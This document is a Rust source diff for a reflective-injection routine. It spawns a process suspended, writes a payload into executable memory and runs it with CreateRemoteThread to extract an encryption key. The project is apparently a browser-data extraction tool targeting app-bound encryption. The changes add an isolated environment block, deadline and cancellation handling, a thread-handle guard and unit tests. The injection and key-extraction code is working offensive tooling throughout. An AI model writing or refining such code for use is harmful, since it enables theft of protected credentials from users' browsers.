@@ -1,35 +1,111 @@
 use anyhow::{anyhow, bail, Result};
-use std::os::windows::ffi::OsStrExt;
+use std::ffi::OsStr;
 use std::path::{Path, PathBuf};
 use std::time::Duration;
 use zeroize::Zeroizing;
 
 use super::constants::*;
 use super::pe::find_export_file_offset;
+use crate::common::deadline::BoundaryRuntime;
 
 const DEFAULT_WAIT_TIMEOUT: Duration = Duration::from_secs(30);
 const ENV_ENC_KEY_B64: &str = "HBD_ABE_ENC_B64";
 
-struct EnvGuard {
-  key: &'static str,
-  prev_val: Option<String>,
-}
-
-impl EnvGuard {
-  fn set(key: &'static str, value: &str) -> Self {
-    let prev_val = std::env::var(key).ok();
-    std::env::set_var(key, value);
-    Self { key, prev_val }
+fn to_utf16_key_val<K: AsRef<OsStr>, V: AsRef<OsStr>>(k: K, v: V) -> (Vec<u16>, Vec<u16>) {
+  #[cfg(windows)]
+  {
+    use std::os::windows::ffi::OsStrExt;
+    (
+      k.as_ref().encode_wide().collect(),
+      v.as_ref().encode_wide().collect(),
+    )
+  }
+  #[cfg(not(windows))]
+  {
+    (
+      k.as_ref().to_string_lossy().encode_utf16().collect(),
+      v.as_ref().to_string_lossy().encode_utf16().collect(),
+    )
   }
 }
 
-impl Drop for EnvGuard {
-  fn drop(&mut self) {
-    match &self.prev_val {
-      Some(val) => std::env::set_var(self.key, val),
-      None => std::env::remove_var(self.key),
+fn ascii_fold_utf16(units: &[u16]) -> Vec<u16> {
+  units
+    .iter()
+    .map(|&c| {
+      if (b'a' as u16..=b'z' as u16).contains(&c) {
+        c - 32
+      } else {
+        c
+      }
+    })
+    .collect()
+}
+
+/// Constructs a Windows Unicode environment block (UTF-16) from an iterator of
+/// environment variables, applying the provided key-value overrides without
+/// mutating the parent process environment.
+///
+/// The returned buffer contains null-terminated `KEY=VALUE\0` strings sorted
+/// case-insensitively (ordinal ASCII folding) by variable name, terminated by a final null character (`\0\0`).
+pub fn create_environment_block<I, K, V>(base_vars: I, overrides: &[(&str, &str)]) -> Vec<u16>
+where
+  I: IntoIterator<Item = (K, V)>,
+  K: AsRef<OsStr>,
+  V: AsRef<OsStr>,
+{
+  use std::collections::BTreeMap;
+
+  // Ordinal case-insensitive key ordering to satisfy Windows environment block requirements.
+  let mut env_map: BTreeMap<Vec<u16>, (Vec<u16>, Vec<u16>)> = BTreeMap::new();
+
+  for (k, v) in base_vars {
+    let (key_u16, val_u16) = to_utf16_key_val(k, v);
+    let key_folded = ascii_fold_utf16(&key_u16);
+    env_map.insert(key_folded, (key_u16, val_u16));
+  }
+
+  for &(k, v) in overrides {
+    let (key_u16, val_u16) = to_utf16_key_val(k, v);
+    let key_folded = ascii_fold_utf16(&key_u16);
+    env_map.insert(key_folded, (key_u16, val_u16));
+  }
+
+  let mut block = Vec::new();
+  for (_key_folded, (k, v)) in env_map {
+    block.extend(k);
+    block.push('=' as u16);
+    block.extend(v);
+    block.push(0);
+  }
+
+  if block.is_empty() {
+    block.push(0);
+  }
+  block.push(0);
+  block
+}
+
+#[cfg(test)]
+pub fn parse_environment_block(block: &[u16]) -> Vec<(String, String)> {
+  let mut result = Vec::new();
+  let mut start = 0;
+  while start < block.len() {
+    if block[start] == 0 {
+      break;
+    }
+    if let Some(end_rel) = block[start..].iter().position(|&c| c == 0) {
+      let end = start + end_rel;
+      let entry = String::from_utf16_lossy(&block[start..end]);
+      if let Some((k, v)) = entry.split_once('=') {
+        result.push((k.to_string(), v.to_string()));
+      }
+      start = end + 1;
+    } else {
+      break;
     }
   }
+  result
 }
 
 struct TempUddGuard {
@@ -105,6 +181,21 @@ impl Drop for ProcessHandlesGuard {
 }
 
 #[cfg(windows)]
+struct RemoteThreadGuard(windows::Win32::Foundation::HANDLE);
+
+#[cfg(windows)]
+impl Drop for RemoteThreadGuard {
+  fn drop(&mut self) {
+    use windows::Win32::Foundation::CloseHandle;
+    if !self.0.is_invalid() {
+      unsafe {
+        let _ = CloseHandle(self.0);
+      }
+    }
+  }
+}
+
+#[cfg(windows)]
 fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>> {
   use windows::core::PCSTR;
   use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
@@ -174,22 +265,27 @@ pub fn inject_and_extract_key(
   exe_path: &Path,
   payload: &[u8],
   encrypted_key_b64: &str,
+  runtime: &BoundaryRuntime<'_>,
 ) -> Result<Zeroizing<Vec<u8>>> {
+  use std::os::windows::ffi::OsStrExt;
   use windows::core::{PCWSTR, PWSTR};
-  use windows::Win32::Foundation::{CloseHandle, WAIT_OBJECT_0, WAIT_TIMEOUT};
+  use windows::Win32::Foundation::{WAIT_OBJECT_0, WAIT_TIMEOUT};
   use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
   use windows::Win32::System::Memory::{
     VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
   };
   use windows::Win32::System::Threading::{
     CreateProcessW, CreateRemoteThread, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
-    PROCESS_INFORMATION, STARTUPINFOW,
+    CREATE_UNICODE_ENVIRONMENT, PROCESS_INFORMATION, STARTUPINFOW,
   };
+
+  runtime.check()?;
 
   let bootstrap_offset = find_export_file_offset(payload, "Bootstrap")?;
   let patched_payload = patch_preresolved_imports(payload)?;
 
-  let _env_guard = EnvGuard::set(ENV_ENC_KEY_B64, encrypted_key_b64);
+  let env_block =
+    create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, encrypted_key_b64)]);
   let udd_guard = TempUddGuard::create()?;
 
   let cmd_line = format!(
@@ -210,6 +306,7 @@ pub fn inject_and_extract_key(
   };
   let mut pi = PROCESS_INFORMATION::default();
 
+  let creation_flags = CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
   let created = unsafe {
     CreateProcessW(
       PCWSTR(app_name_w.as_ptr()),
@@ -217,8 +314,8 @@ pub fn inject_and_extract_key(
       None,
       None,
       false,
-      CREATE_SUSPENDED,
-      None,
+      creation_flags,
+      Some(env_block.as_ptr().cast()),
       None,
       &si,
       &mut pi,
@@ -234,6 +331,8 @@ pub fn inject_and_extract_key(
   }
 
   let mut proc_guard = ProcessHandlesGuard::new(pi.hProcess, pi.hThread);
+
+  runtime.check()?;
 
   let remote_base = unsafe {
     VirtualAllocEx(
@@ -272,7 +371,12 @@ pub fn inject_and_extract_key(
   unsafe {
     let _ = ResumeThread(pi.hThread);
   }
-  std::thread::sleep(Duration::from_millis(50));
+  let loader_wait = runtime
+    .deadline
+    .remaining(runtime.clock)
+    .min(Duration::from_millis(50));
+  runtime.clock.sleep(loader_wait);
+  runtime.check()?;
 
   let entry_addr = (remote_base as usize + bootstrap_offset) as *const ();
   let mut thread_id = 0;
@@ -291,27 +395,49 @@ pub fn inject_and_extract_key(
     )
   };
 
-  let remote_thread = match remote_thread {
+  let remote_thread_handle = match remote_thread {
     Ok(h) if !h.is_invalid() => h,
     Err(e) => bail!("CreateRemoteThread failed: {e}"),
     _ => bail!("CreateRemoteThread returned invalid handle"),
   };
 
-  let wait_state =
-    unsafe { WaitForSingleObject(remote_thread, DEFAULT_WAIT_TIMEOUT.as_millis() as u32) };
-  let _ = unsafe { CloseHandle(remote_thread) };
+  let remote_thread = RemoteThreadGuard(remote_thread_handle);
 
-  if wait_state == WAIT_TIMEOUT {
-    bail!(
-      "Remote Bootstrap thread timed out after {:?}",
-      DEFAULT_WAIT_TIMEOUT
-    );
-  } else if wait_state != WAIT_OBJECT_0 {
-    bail!(
-      "Remote Bootstrap thread wait failed (code 0x{:x})",
-      wait_state.0
-    );
+  const POLL_INTERVAL: Duration = Duration::from_millis(50);
+  let loop_start = runtime.clock.now();
+  loop {
+    runtime.check()?;
+
+    let remaining = runtime.deadline.remaining(runtime.clock);
+    let time_elapsed = runtime.clock.now().saturating_duration_since(loop_start);
+    let overall_remaining = DEFAULT_WAIT_TIMEOUT.saturating_sub(time_elapsed);
+
+    if overall_remaining.is_zero() {
+      bail!(
+        "Remote Bootstrap thread timed out after {:?}",
+        DEFAULT_WAIT_TIMEOUT
+      );
+    }
+
+    let wait_slice = remaining.min(overall_remaining).min(POLL_INTERVAL);
+    let wait_ms = u32::try_from(wait_slice.as_millis())
+      .unwrap_or(u32::MAX)
+      .max(1);
+
+    let wait_state = unsafe { WaitForSingleObject(remote_thread.0, wait_ms) };
+    if wait_state == WAIT_OBJECT_0 {
+      break;
+    } else if wait_state == WAIT_TIMEOUT {
+      continue;
+    } else {
+      bail!(
+        "Remote Bootstrap thread wait failed (code 0x{:x})",
+        wait_state.0
+      );
+    }
   }
+
+  runtime.check()?;
 
   // Read scratch result
   let mut hdr = [0u8; 12];
@@ -382,6 +508,140 @@ pub fn inject_and_extract_key(
   _exe_path: &Path,
   _payload: &[u8],
   _encrypted_key_b64: &str,
+  _runtime: &BoundaryRuntime<'_>,
 ) -> Result<Zeroizing<Vec<u8>>> {
   bail!("Reflective injection is only available on Windows")
+}
+
+#[cfg(test)]
+mod tests {
+  use super::*;
+  use crate::common::deadline::{test_clock::ManualClock, BoundaryRuntime, Deadline};
+
+  #[test]
+  fn environment_block_creates_sorted_unicode_block_with_overrides() {
+    let base = vec![
+      ("PATH", "C:\\Windows"),
+      ("TEMP", "C:\\Temp"),
+      ("HBD_ABE_ENC_B64", "stale_value"),
+    ];
+    let overrides = [("HBD_ABE_ENC_B64", "new_fresh_encrypted_blob")];
+    let block = create_environment_block(base, &overrides);
+    let parsed = parse_environment_block(&block);
+
+    assert_eq!(
+      parsed,
+      vec![
+        (
+          "HBD_ABE_ENC_B64".to_string(),
+          "new_fresh_encrypted_blob".to_string()
+        ),
+        ("PATH".to_string(), "C:\\Windows".to_string()),
+        ("TEMP".to_string(), "C:\\Temp".to_string()),
+      ]
+    );
+  }
+
+  #[test]
+  fn environment_block_preserves_distinct_unicode_keys_under_ordinal_folding() {
+    let base = vec![
+      ("ß_VAR", "value_sharp_s"),
+      ("SS_VAR", "value_double_s"),
+      ("mixed_case", "val1"),
+      ("MIXED_CASE", "val2_overwritten"),
+    ];
+    let overrides = [("NEW_VAR", "val3")];
+    let block = create_environment_block(base, &overrides);
+    let parsed = parse_environment_block(&block);
+
+    // ß and SS must both be preserved as distinct variables under Windows ordinal folding
+    assert!(parsed
+      .iter()
+      .any(|(k, v)| k == "ß_VAR" && v == "value_sharp_s"));
+    assert!(parsed
+      .iter()
+      .any(|(k, v)| k == "SS_VAR" && v == "value_double_s"));
+    // Case-insensitive ASCII collision correctly overrides
+    let mixed: Vec<_> = parsed
+      .iter()
+      .filter(|(k, _)| k.eq_ignore_ascii_case("mixed_case"))
+      .collect();
+    assert_eq!(mixed.len(), 1);
+    assert_eq!(mixed[0].1, "val2_overwritten");
+  }
+
+  #[test]
+  fn environment_block_handles_empty_base() {
+    let base: Vec<(String, String)> = Vec::new();
+    let overrides = [("HBD_ABE_ENC_B64", "blob123")];
+    let block = create_environment_block(base, &overrides);
+    let parsed = parse_environment_block(&block);
+
+    assert_eq!(
+      parsed,
+      vec![("HBD_ABE_ENC_B64".to_string(), "blob123".to_string())]
+    );
+  }
+
+  #[test]
+  fn environment_block_handles_completely_empty() {
+    let base: Vec<(String, String)> = Vec::new();
+    let overrides: [(&str, &str); 0] = [];
+    let block = create_environment_block(base, &overrides);
+    assert_eq!(block, vec![0, 0]);
+    let parsed = parse_environment_block(&block);
+    assert!(parsed.is_empty());
+  }
+
+  #[test]
+  fn two_parallel_workers_receive_their_own_encrypted_blob_without_parent_mutation() {
+    // Invariant: parent environment must never have HBD_ABE_ENC_B64 set
+    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
+
+    let handles: Vec<_> = (0..10)
+      .map(|i| {
+        std::thread::spawn(move || {
+          let blob = format!("encrypted_blob_for_worker_{i}");
+          let block = create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, &blob)]);
+          let parsed = parse_environment_block(&block);
+          let found = parsed
+            .into_iter()
+            .find(|(k, _)| k.eq_ignore_ascii_case(ENV_ENC_KEY_B64))
+            .expect("must contain HBD_ABE_ENC_B64");
+          assert_eq!(found.1, blob);
+          assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
+        })
+      })
+      .collect();
+
+    for h in handles {
+      h.join().unwrap();
+    }
+
+    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
+  }
+
+  #[test]
+  fn parent_environment_unchanged_across_panic_and_cancellation() {
+    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
+
+    let _ = std::panic::catch_unwind(|| {
+      let _block =
+        create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, "blob_will_panic")]);
+      panic!("simulated panic");
+    });
+
+    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
+  }
+
+  #[test]
+  fn deadline_expiry_stops_promptly_without_unbounded_wait() {
+    let clock = ManualClock::default();
+    let runtime = BoundaryRuntime::new(&clock, Deadline::after(&clock, Duration::from_secs(2)));
+
+    // Advance clock past the 2-second deadline
+    clock.advance(Duration::from_secs(3));
+    let stop_err = runtime.check().expect_err("deadline must expire");
+    assert_eq!(stop_err, crate::common::deadline::BoundaryStop::TimedOut);
+  }
 }
